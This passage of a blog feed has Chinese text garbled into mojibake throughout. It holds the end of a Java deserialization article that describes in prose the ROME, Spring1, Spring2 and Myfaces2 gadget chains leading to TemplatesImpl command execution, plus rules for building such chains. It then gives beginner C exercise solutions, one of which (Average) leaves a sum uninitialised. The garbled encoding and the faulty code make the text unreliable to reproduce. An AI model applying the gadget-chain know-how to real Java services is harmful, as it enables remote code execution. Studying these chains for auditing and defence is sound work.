<p>æ‰§è¡Œè¿‡ç¨‹ä¸Myfaces1ä¸€è‡´ï¼Œä½†Myfaces2çš„ELè¡¨è¾¾å¼å¹¶ä¸æ˜¯ç”±ä½¿ç”¨è€…ä¼ å…¥çš„ï¼Œè€Œæ˜¯é¢„åˆ¶äº†ä¸€ä¸²åŠ è½½è¿œç¨‹æ¶æ„å¯¹è±¡çš„è¡¨è¾¾å¼</p>
<h3 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>HashMap</code></p>
<p><code>HashMap.readObject()</code>é€šè¿‡<code>ObjectBean.hashCode()</code>è®¡ç®—hashæ—¶ï¼Œä¼šåœ¨<code>ToStringBean.toString()</code>é˜¶æ®µéå†<code>TemplatesImpl</code>æ‰€æœ‰å­—æ®µçš„Setterå’ŒGetterå¹¶è°ƒç”¨ï¼Œå½“è°ƒç”¨åˆ°<code>getOutputProperties()</code>æ—¶å°†å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
<hr>
<h3 id="Spring1"><a href="#Spring1" class="headerlink" title="Spring1"></a>Spring1</h3><p><font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code></p>
<p><code>SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</code>åœ¨è°ƒç”¨<code>TypeProvider.getType()</code>æ—¶è¢«ä»£ç†ç»™<code>AnnotationInvocationHandler</code>å¾—åˆ°å¦ä¸€ä¸ªHandlerä¸º<code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>çš„ä»£ç†ï¼Œä¹‹åä¼ ç»™<code>ReflectionUtils.invokeMethod()</code>åŠ¨æ€è°ƒç”¨<code>newTransformer</code>æ–¹æ³•æ—¶è¢«ç¬¬äºŒä¸ªä»£ç†æ‹¦æˆªï¼Œå®ƒçš„<code>objectFactory</code>å­—æ®µæ˜¯ç¬¬ä¸‰ä¸ªä»£ç†ï¼Œå› æ­¤<code>objectFactory.getObject()</code>ä¼šè·å¾—<code>TemplatesImpl</code>ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
<h3 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h3><p> <font color="#0099ff">å‘½ä»¤æ‰§è¡Œè½½ä½“ï¼š</font><code>org.apache.xalan.xsltc.trax.TemplatesImpl</code></p>
<p><font color="#0099ff">ååºåˆ—åŒ–è½½ä½“ï¼š</font><code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code></p>
<p> <code>SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</code>åœ¨åŠ¨æ€è°ƒç”¨<code>newTransformer</code>æ–¹æ³•æ—¶ï¼Œè¢«ç¬¬äºŒä¸ªä»£ç†æ‹¦æˆªäº¤ç»™<code>JdkDynamicAopProxy</code>ï¼Œå®ƒåœ¨<code>AopUtils.invokeJoinpointUsingReflection()</code>æ—¶ä¼šä¼ å…¥ä»<code>AdvisedSupport.targetSource</code>å­—æ®µä¸­å–å‡ºæ¥çš„<code>TemplatesImpl</code>ï¼Œæœ€ç»ˆå¯¼è‡´å‘½ä»¤æ‰§è¡Œ</p>
<p>æ ¹æ®ä¸Šé¢è¿™äº›å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å‡ æ¡ç®€å•çš„POPæ„é€ æ³•åˆ™ï¼š</p>
<ol>
<li>å½“ä¾èµ–ä¸­ä¸å­˜åœ¨å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•æ—¶ï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨<code>TemplatesImpl</code>ä½œä¸ºå‘½ä»¤æ‰§è¡Œè½½ä½“ï¼Œå¹¶æƒ³åŠæ³•å»è§¦å‘å®ƒçš„<code>newTransformer</code>æˆ–<code>getOutputProperties</code>æ–¹æ³•</li>
<li>å¯ä»¥ä½œä¸ºå…¥å£çš„é€šç”¨ååºåˆ—åŒ–è½½ä½“æ˜¯<code>HashMap</code>ã€<code>AnnotationInvocationHandler</code>ã€<code>BadAttributeValueExpException</code>å’Œ<code>PriorityQueue</code>ï¼Œå®ƒä»¬éƒ½æ˜¯ä¾èµ–è¾ƒå°‘çš„JDKåº•å±‚å¯¹è±¡ï¼ŒåŒºåˆ«å¦‚ä¸‹ï¼š<ul>
<li><code>HashMap</code>ï¼Œå¯ä»¥ä¸»åŠ¨è§¦å‘å…ƒç´ çš„<code>hashCode</code>å’Œ<code>equals</code>æ–¹æ³•</li>
<li><code>AnnotationInvocationHandler</code>ï¼Œå¯ä»¥ä¸»åŠ¨è§¦å‘<code>memberValues</code>å­—æ®µçš„<code>setValue</code>æ–¹æ³•ï¼Œæœ¬èº«ä¹Ÿå¯ä»¥ä½œä¸ºåŠ¨æ€ä»£ç†çš„Handleræ‹¦æˆªå¦‚<code>Map.entrySet</code>ç­‰æ–¹æ³•è¿›å…¥è‡ªå·±çš„<code>invoke</code>æ–¹æ³•</li>
<li><code>BadAttributeValueExpException</code>ï¼Œå¯ä»¥ä¸»åŠ¨è§¦å‘<code>val</code>å­—æ®µçš„<code>toString</code>æ–¹æ³•</li>
<li><code>PriorityQueue</code>ï¼Œå¯ä»¥ä¸»åŠ¨è§¦å‘<code>comparator</code>å­—æ®µçš„<code>compare</code>æ–¹æ³•</li>
</ul>
</li>
</ol>
<hr>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å†å¹´æ¥ï¼Œå¾ˆå¤šæµè¡Œçš„Javaç»„ä»¶æ¡†æ¶éƒ½è¢«çˆ†å‡ºè¿‡ååºåˆ—åŒ–æ¼æ´ï¼Œè¿™å·²ç»æœ‰å¥½å¤šå¤§ç‰›ä»¬éƒ½è¿›è¡Œè¿‡åˆ†ææ€»ç»“äº†ï¼Œæœ¬æ–‡çš„ä¸»è¦ç›®çš„ä¹Ÿä¸åœ¨æ­¤ï¼Œè€Œæ˜¯ä¸ºäº†å»æ·±æŒ–ååºåˆ—åŒ–æ¼æ´åº•å±‚ä¸€äº›å¯èƒ½è¿˜æ²¡æœ‰è¢«å”¤é†’çš„åœ°æ–¹ã€‚</p>
<p>ä¸è¿‡æœ‰ä¸€ç‚¹è¦åˆ‡è®°ï¼Œååºåˆ—åŒ–ä¸æ­¢RCEã€‚</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ol>
<li><a href="https://docs.oracle.com/javase/8/docs/" target="_blank" rel="noopener">JavaSE Document</a></li>
<li><a href="http://hg.openjdk.java.net/" target="_blank" rel="noopener">Java OpenJDK Source Code</a></li>
<li><a href="https://github.com/unofficial-openjdk/openjdk/" target="_blank" rel="noopener">Java OpenJDK GitHub Mirror</a></li>
</ol>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>PTA aé¢˜</title>
    <url>/yakko117/2020/03/02/PTAbasic/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>ç®—æ³•åŸç†è¦èŠ±æ—¶é—´å¥½å¥½æ‘¸ä¸€ä¸‹ï¼Œæ¨èä¸€ä¸ªå¤§ä½¬çš„æ•°æ®ç»“æ„ç®—æ³•è¯¦è§£<br><a href="https://github.com/labuladong/fucking-algorithm" target="_blank" rel="noopener">æ‰‹æŠŠæ‰‹æ’•LeetCodeé¢˜ç›®ï¼Œæ‰’å„ç§ç®—æ³•å¥—è·¯çš„è£¤å­</a></p>
<a id="more"></a>

<h1 id="åŸºç¡€ç¼–ç¨‹é¢˜ç›®é›†"><a href="#åŸºç¡€ç¼–ç¨‹é¢˜ç›®é›†" class="headerlink" title="åŸºç¡€ç¼–ç¨‹é¢˜ç›®é›†"></a>åŸºç¡€ç¼–ç¨‹é¢˜ç›®é›†</h1><h2 id="6-1-ç®€å•è¾“å‡ºæ•´æ•°-10åˆ†"><a href="#6-1-ç®€å•è¾“å‡ºæ•´æ•°-10åˆ†" class="headerlink" title="6-1 ç®€å•è¾“å‡ºæ•´æ•° (10åˆ†)"></a>6-1 ç®€å•è¾“å‡ºæ•´æ•° (10åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œå¯¹ç»™å®šçš„æ­£æ•´æ•° <code>N</code>ï¼Œæ‰“å°ä»1åˆ°Nçš„å…¨éƒ¨æ­£æ•´æ•°ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintN</span> <span class="params">( <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­Næ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°ã€‚è¯¥å‡½æ•°å¿…é¡»å°†ä»1åˆ°Nçš„å…¨éƒ¨æ­£æ•´æ•°é¡ºåºæ‰“å°å‡ºæ¥ï¼Œæ¯ä¸ªæ•°å­—å 1è¡Œã€‚</p>
<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintN</span> <span class="params">( <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    PrintN( N );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥æ ·ä¾‹ï¼š</span><br><span class="line">3</span><br><span class="line">è¾“å‡ºæ ·ä¾‹ï¼š</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”"><a href="#è§£ç­”" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintN</span> <span class="params">( <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;=N; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-2-å¤šé¡¹å¼æ±‚å€¼-15åˆ†"><a href="#6-2-å¤šé¡¹å¼æ±‚å€¼-15åˆ†" class="headerlink" title="6-2 å¤šé¡¹å¼æ±‚å€¼ (15åˆ†)"></a>6-2 å¤šé¡¹å¼æ±‚å€¼ (15åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œè®¡ç®—é˜¶æ•°ä¸º <code>n</code>ï¼Œç³»æ•°ä¸º<code>a[0]</code> â€¦ <code>a[n]</code>çš„å¤šé¡¹å¼<br>$$f(x)=\sum_{i=0}^n(a[i]Ã—x^i<br>)$$åœ¨xç‚¹çš„å€¼ã€‚</p>
<p>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">( <span class="keyword">int</span> n, <span class="keyword">double</span> a[], <span class="keyword">double</span> x )</span></span>;</span><br></pre></td></tr></table></figure></div>
<p>å…¶ä¸­ <code>n</code> æ˜¯å¤šé¡¹å¼çš„é˜¶æ•°ï¼Œ<code>a[]</code> ä¸­å­˜å‚¨ç³»æ•°ï¼Œ<code>x</code> æ˜¯ç»™å®šç‚¹ã€‚å‡½æ•°é¡»è¿”å›å¤šé¡¹å¼ <code>f(x)</code> çš„å€¼ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥æ ·ä¾‹ï¼š</span><br><span class="line">2 1.1</span><br><span class="line">1 2.5 -38.7</span><br><span class="line">è¾“å‡ºæ ·ä¾‹ï¼š</span><br><span class="line">-43.1</span><br></pre></td></tr></table></figure></div>

<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-1"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-1" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10 <span class="comment">// å®šä¹‰æœ€å¤š10ä¸ªaé¡¹</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">( <span class="keyword">int</span> n, <span class="keyword">double</span> a[], <span class="keyword">double</span> x )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="keyword">double</span> a[MAXN], x;</span><br><span class="line">    <span class="comment">// double å°±æ˜¯æ¯” float ç²¾åº¦æ›´é«˜çš„æµ®ç‚¹æ•°è¡¨ç¤ºç±»å‹</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %lf"</span>, &amp;n, &amp;x);</span><br><span class="line">    <span class="comment">// %lf åŒç²¾åº¦æµ®ç‚¹å‹æ•°æ®çš„è¾“å…¥æ ¼å¼æ§åˆ¶ç¬¦</span></span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;=n; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.1f\n"</span>, f(n, a, x));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”ï¼š"><a href="#è§£ç­”ï¼š" class="headerlink" title="è§£ç­”ï¼š"></a>è§£ç­”ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">( <span class="keyword">int</span> n, <span class="keyword">double</span> a[], <span class="keyword">double</span> x )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> sum = a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">double</span> res = <span class="number">1.0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; ++i) &#123;</span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        int i = 3 ;</span></span><br><span class="line"><span class="comment">        a = i++; -&gt; a=3 -&gt; å…ˆè®©aå˜æˆiçš„å€¼ï¼Œå†è®©iåŠ 1</span></span><br><span class="line"><span class="comment">        b = ++i; -&gt; b=4 -&gt; å…ˆè®©iåŠ 1, å†è®©bå˜æˆiçš„å€¼</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        res *= x; <span class="comment">// res = x, x^2, x^3...  // res = res*x</span></span><br><span class="line">        sum += a[i] * res; <span class="comment">// sum = sum + a[i]*res</span></span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        printf("i=: %d", i);</span></span><br><span class="line"><span class="comment">        echo "i=1 / i=2"</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-3-ç®€å•æ±‚å’Œ-10åˆ†"><a href="#6-3-ç®€å•æ±‚å’Œ-10åˆ†" class="headerlink" title="6-3 ç®€å•æ±‚å’Œ (10åˆ†)"></a>6-3 ç®€å•æ±‚å’Œ (10åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚ç»™å®šçš„ <code>N</code> ä¸ªæ•´æ•°çš„å’Œã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span> <span class="params">( <span class="keyword">int</span> List[], <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ç»™å®šæ•´æ•°å­˜æ”¾åœ¨æ•°ç»„ <code>List[]</code> ä¸­ï¼Œæ­£æ•´æ•°Næ˜¯æ•°ç»„å…ƒç´ ä¸ªæ•°ã€‚è¯¥å‡½æ•°é¡»è¿”å›Nä¸ª <code>List[]</code> å…ƒç´ çš„å’Œã€‚</p>
<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-2"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-2" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span> <span class="params">( <span class="keyword">int</span> List[], <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> List[MAXN], N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;List[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, Sum(List, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">3</span><br><span class="line">12 34 -5</span><br><span class="line">è¾“å‡º</span><br><span class="line">41</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”-1"><a href="#è§£ç­”-1" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span> <span class="params">( <span class="keyword">int</span> List[], <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> sum =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ ) &#123;</span><br><span class="line">        sum += List[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-4-æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„å¹³å‡-10åˆ†"><a href="#6-4-æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„å¹³å‡-10åˆ†" class="headerlink" title="6-4 æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„å¹³å‡ (10åˆ†)"></a>6-4 æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„å¹³å‡ (10åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚Nä¸ªé›†åˆå…ƒç´  <code>S[]</code> çš„å¹³å‡å€¼ï¼Œå…¶ä¸­é›†åˆå…ƒç´ çš„ç±»å‹ä¸ºè‡ªå®šä¹‰çš„ <code>ElementType</code>ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Average</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div>
<p>å…¶ä¸­ç»™å®šé›†åˆå…ƒç´ å­˜æ”¾åœ¨ <code>æ•°ç»„S[]</code>ä¸­ï¼Œæ­£æ•´æ•°Næ˜¯æ•°ç»„å…ƒç´ ä¸ªæ•°ã€‚è¯¥å‡½æ•°é¡»è¿”å›Nä¸ª <code>S[]</code>å…ƒç´ çš„å¹³å‡å€¼ï¼Œå…¶å€¼ä¹Ÿå¿…é¡»æ˜¯<code>ElementTypeç±»å‹</code>ã€‚</p>
<h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-3"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-3" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> ElementType;</span><br><span class="line"></span><br><span class="line"><span class="function">ElementType <span class="title">Average</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ElementType S[MAXN];</span><br><span class="line">    <span class="keyword">int</span> N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%f"</span>, &amp;S[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f\n"</span>, Average(S, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">3</span><br><span class="line">12.3 34 -5</span><br><span class="line">è¾“å‡º</span><br><span class="line">13.77</span><br></pre></td></tr></table></figure></div>

<h3 id="è§£ç­”-2"><a href="#è§£ç­”-2" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Average</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    ElementType sum, average;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;N; i++) &#123;</span><br><span class="line">        sum += S[i];</span><br><span class="line">    &#125;</span><br><span class="line">    average = sum/N;</span><br><span class="line">    <span class="keyword">return</span> average;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="6-5-æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„æœ€å¤§å€¼-10åˆ†"><a href="#6-5-æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„æœ€å¤§å€¼-10åˆ†" class="headerlink" title="6-5 æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„æœ€å¤§å€¼ (10åˆ†)"></a>6-5 æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„æœ€å¤§å€¼ (10åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚Nä¸ªé›†åˆå…ƒç´  <code>S[]</code> ä¸­çš„æœ€å¤§å€¼ï¼Œå…¶ä¸­é›†åˆå…ƒç´ çš„ç±»å‹ä¸ºè‡ªå®šä¹‰çš„ <code>ElementType</code>ã€‚</p>
<p>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Max</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div>
